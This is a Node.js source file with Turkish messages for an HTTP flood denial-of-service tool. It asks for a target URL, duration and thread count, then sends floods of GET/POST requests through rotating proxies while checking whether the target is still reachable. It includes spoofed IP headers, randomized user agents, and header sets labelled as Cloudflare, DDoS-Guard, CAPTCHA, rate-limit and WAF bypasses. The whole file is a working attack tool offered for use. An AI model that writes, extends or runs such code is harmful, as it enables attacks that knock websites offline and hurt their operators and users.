```javascript
const axios = require('axios');
const fs = require('fs').promises;
const colors = require('colors/safe');
const readline = require('readline');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

let proxies = [];
let validProxies = [];

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
];

const bypassHeaders = {
  'CF': {
    'User-Agent': getRandom(userAgents),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
  },
  'DDG': {
    'User-Agent': getRandom(userAgents),
    'Accept': '*/*',
    'Referer': 'https://www.google.com/',
    'DNT': '1',
    'Connection': 'keep-alive'
  },
  'CAPTCHA': {
    'User-Agent': getRandom(userAgents),
    'Accept': 'application/json, text/plain, */*',
    'X-Requested-With': 'XMLHttpRequest'
  },
  'RATE_LIMIT': {
    'User-Agent': getRandom(userAgents),
    'Accept': '*/*',
    'Connection': 'close',
    'X-Forwarded-For': generateRandomIP()
  },
  'WAF': {
    'User-Agent': getRandom(userAgents),
    'Accept': 'text/html',
    'Accept-Encoding': 'gzip, deflate, br',
    'X-Real-IP': generateRandomIP()
  },
  'UAM': {
    'User-Agent': generateRandomUA(),
    'Accept': 'text/html,application/xhtml+xml',
    'Connection': 'keep-alive',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none'
  }
};

function getRandom(array) {
  return array[Math.floor(Math.random() * array.length)];
}

function generateRandomIP() {
  // Template literal yerine basit string birleştirme
  const octets = [
    Math.floor(Math.random() * 255),
    Math.floor(Math.random() * 255),
    Math.floor(Math.random() * 255),
    Math.floor(Math.random() * 255)
  ];
  return octets.join('.');
}

function generateRandomUA() {
  const browsers = ['Chrome', 'Firefox', 'Safari', 'Edge'];
  const versions = ['91.0.4472.124', '89.0', '14.1.2', '92.0.902.62'];
  return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) ${getRandom(browsers)}/${getRandom(versions)}`;
}

function log(msg, color = 'white') {
  try {
    console.log(colors[color](msg));
  } catch (err) {
    console.log(`Log hatası: ${err.message}`);
    console.log(msg);
  }
}

async function loadProxies() {
  try {
    const data = await fs.readFile('proxies.txt', 'utf8');
    proxies = data.split('\n').map(p => p.trim()).filter(Boolean);
    log(`${proxies.length} proxy yüklendi`, 'green');
    await validateProxies();
  } catch (err) {
    log('proxies.txt bulunamadı!', 'red');
    process.exit(1);
  }
}

async function validateProxies() {
  log('Proxy\'ler kontrol ediliyor...', 'yellow');
  const testUrl = 'http://httpbin.org/ip';
  validProxies = [];

  for (const proxy of proxies) {
    try {
      const [ip, port] = proxy.split(':');
      const agent = proxy.includes('socks')
        ? new SocksProxyAgent(`socks5://${ip}:${port}`)
        : new HttpsProxyAgent(`http://${ip}:${port}`);
      const res = await axios.get(testUrl, { httpAgent: agent, httpsAgent: agent, timeout: 5000 });
      if (res.status === 200) {
        validProxies.push(proxy);
      }
    } catch {
      continue;
    }
  }
  log(`${validProxies.length} geçerli proxy bulundu`, 'green');
  if (validProxies.length === 0) {
    log('Geçerli proxy bulunamadı!', 'red');
    process.exit(1);
  }
}

async function sendRequest(url, method = 'GET', bypassType = null) {
  const proxy = getRandom(validProxies);
  let headers = {
    'User-Agent': getRandom(userAgents),
    'Accept': '*/*',
    'Connection': 'keep-alive'
  };

  if (bypassType && bypassHeaders[bypassType]) {
    headers = { ...headers, ...bypassHeaders[bypassType] };
  }

  const config = {
    method: method === 'POST' ? 'post' : 'get',
    url,
    headers,
    timeout: 8000
  };

  if (proxy) {
    const [ip, port] = proxy.split(':');
    const agent = proxy.includes('socks')
      ? new SocksProxyAgent(`socks5://${ip}:${port}`)
      : new HttpsProxyAgent(`http://${ip}:${port}`);
    config.httpAgent = agent;
    config.httpsAgent = agent;
  }

  try {
    const res = await axios(config);
    return { status: res.status, success: true };
  } catch (err) {
    return { success: false, error: err.code || err.message };
  }
}

function startPing(url) {
  setInterval(async () => {
    try {
      const res = await axios.get(url, { timeout: 5000 });
      log(`Ping başarılı - Durum: ${res.status}`, 'green');
    } catch {
      log(`Ping başarısız - Site erişilemez`, 'red');
    }
  }, 10000);
}

async function startAttack({ url, duration, method, threads, bypassType }) {
  const end = Date.now() + duration * 1000;
  let success = 0, fail = 0;

  log('SALDIRI BAŞLADI!', 'rainbow');
  log(`Hedef: ${url}`, 'cyan');
  log(`Süre: ${duration}s`, 'cyan');
  log(`Thread: ${threads}`, 'cyan');
  log(`Metod: ${method}${bypassType ? ` (${bypassType} Bypass)` : ''}`, 'cyan');

  startPing(url);

  const attack = async () => {
    while (Date.now() < end) {
      const effectiveMethod = method === 'MIXED' ? getRandom(['GET', 'POST']) : method;
      const res = await sendRequest(url, effectiveMethod, bypassType);
      if (res.success) {
        success++;
        process.stdout.write(`[+] ${res.status} `.green);
      } else {
        fail++;
        process.stdout.write(`[-] ${res.error} `.red);
      }
    }
  };

  const runners = Array.from({ length: threads }, () => attack());
  await Promise.all(runners);

  log(`Saldırı tamamlandı! Başarılı: ${success}, Başarısız: ${fail}`, 'yellow');
}

async function ask(query) {
  return new Promise(resolve => rl.question(query, resolve));
}

async function main() {
  await loadProxies();

  console.clear();
  console.log('L7 Gelişmiş Saldırı Aracı v2'.rainbow);
  console.log('1 - GET Flood');
  console.log('2 - POST Flood');
  console.log('3 - Cloudflare Bypass');
  console.log('4 - DDoS-Guard Bypass');
  console.log('5 - CAPTCHA Bypass');
  console.log('6 - Rate Limit Bypass');
  console.log('7 - WAF Bypass');
  console.log('8 - UAM Bypass');
  console.log('9 - Karışık');

  const methodMap = {
    '1': { method: 'GET', bypass: null },
    '2': { method: 'POST', bypass: null },
    '3': { method: 'GET', bypass: 'CF' },
    '4': { method: 'GET', bypass: 'DDG' },
    '5': { method: 'GET', bypass: 'CAPTCHA' },
    '6': { method: 'GET', bypass: 'RATE_LIMIT' },
    '7': { method: 'GET', bypass: 'WAF' },
    '8': { method: 'GET', bypass: 'UAM' },
    '9': { method: 'MIXED', bypass: null }
  };

  const methodInput = await ask('Metod Seç (1-9): ');
  const selectedMethod = methodMap[methodInput] || { method: 'GET', bypass: null };

  const url = await ask('Hedef URL (örn: https://site.com): ');
  const duration = parseInt(await ask('Süre (saniye): ')) || 60;
  const threads = parseInt(await ask('Kaç thread: ')) || 10;

  rl.close();

  await startAttack({
    url,
    duration,
    method: selectedMethod.method,
    threads,
    bypassType: selectedMethod.bypass
  });
}

main().catch(err => {
  log(`Hata: ${err.message}`, 'red');
  process.exit(1);
});
```